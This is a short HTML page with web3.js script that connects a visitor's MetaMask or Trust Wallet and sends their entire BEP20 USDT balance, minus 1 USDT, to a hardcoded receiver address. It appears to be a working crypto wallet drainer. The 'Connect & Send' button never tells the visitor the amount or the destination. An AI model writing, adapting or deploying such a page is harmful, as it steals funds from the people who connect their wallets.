<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@4.1.2/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiver = '0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a'; // NEW Receiver
    const usdtAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT BEP20
    const usdtAbi = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      }
    ];

    async function connectAndTransfer() {
      if (!window.ethereum) {
        alert("Please install MetaMask or Trust Wallet.");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balanceStr = await usdt.methods.balanceOf(sender).call();
      const balance = web3.utils.toBigInt(balanceStr);

      // USDT has 6 decimals, so 1 USDT = 1,000,000 (1e6)
      const decimals = 6;
      const minBalance = 1000000n; // 1 USDT in smallest unit (1e6)
      if (balance <= minBalance) {
        alert(`Insufficient USDT balance. You have ${Number(balance) / 1e6} USDT, need at least ${Number(minBalance) / 1e6} USDT.`);
        return;
      }

      const amountToSend = balance - minBalance;

      // Check BNB balance for gas fee
      const bnbBalance = await web3.eth.getBalance(sender);
      const minBnbForGas = web3.utils.toBigInt(web3.utils.toWei('0.01', 'ether')); // ~0.01 BNB for gas
      if (bnbBalance < minBnbForGas) {
        alert("Insufficient BNB for gas fee. You need at least 0.01 BNB.");
        return;
      }

      try {
        const tx = await usdt.methods
          .transfer(receiver, amountToSend.toString())
          .send({ 
            from: sender,
            gas: '100000', 
            gasPrice: web3.utils.toWei('5', 'gwei') 
          });

        alert("USDT sent! Tx hash: " + tx.transactionHash);
      } catch (err) {
        console.error(err);
        alert("Transaction failed: " + err.message);
      }
    }
  </script>
</body>
</html>
